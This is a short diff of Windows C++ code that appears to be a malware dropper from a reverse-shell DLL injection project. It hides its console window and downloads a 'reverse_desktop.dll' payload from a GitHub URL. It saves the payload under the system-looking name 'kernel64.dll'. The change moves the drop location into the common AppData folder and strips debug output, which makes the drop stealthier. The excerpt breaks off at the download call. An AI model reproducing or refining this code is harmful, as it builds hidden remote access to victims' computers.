@@ -4,7 +4,7 @@
 #include <wininet.h>
 #include <string>
 #include <urlmon.h>
-#include <iostream>
+#include <Shlobj.h>
 
 #pragma comment(lib, "Urlmon.lib")
 #pragma comment(lib, "Wininet.lib")
@@ -30,9 +30,10 @@ int main(int argc, const char* argv[])
 {
 	ShowWindow(GetConsoleWindow(), NULL);
 	const CHAR url[] = "https://github.com/noahehrnstrom/dllinject_reverse_shell/blob/main/bin/reverse_desktop.dll?raw=true";
-	std::string filePath = argv[0];
-	filePath += "\\..\\kernel64.dll";
-	std::cout << filePath << std::endl;
+	char path[MAX_PATH];
+	SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
+	std::string filePath = path;
+	filePath += "\\kernel64.dll";
 	DeleteUrlCacheEntryA(url);
 
 	HRESULT hr = URLDownloadToFileA(
